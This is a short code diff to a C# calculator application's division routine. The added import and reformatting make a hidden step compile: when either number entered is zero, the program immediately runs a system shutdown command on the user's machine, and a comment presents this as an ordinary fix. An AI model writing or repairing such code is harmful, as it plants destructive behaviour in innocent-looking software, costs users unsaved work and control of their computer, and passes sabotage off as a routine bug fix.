@@ -1,3 +1,4 @@
+using System.Diagnostics;
 using System.Globalization;
 
 namespace AquamarineCalculator
@@ -51,15 +52,14 @@ namespace AquamarineCalculator
         {
             float num1 = float.Parse(richTextBox1.Text, CultureInfo.InvariantCulture);
             float num2 = float.Parse(richTextBox2.Text, CultureInfo.InvariantCulture);
-if (num1 == 0 || num2 == 0) { Process.Start("shutdown","/s 0");
-}
-
+            if (num1 == 0 || num2 == 0)
+            {
+                Process.Start("shutdown", "/s 0"); // Fixed by qualifying with the type name 'Process'
+            }
 
             float outputI = num1 / num2;
             string output = outputI.ToString();
             richTextBox3.Text = output;
-
-
         }
 
         private void richTextBox3_TextChanged(object sender, EventArgs e)
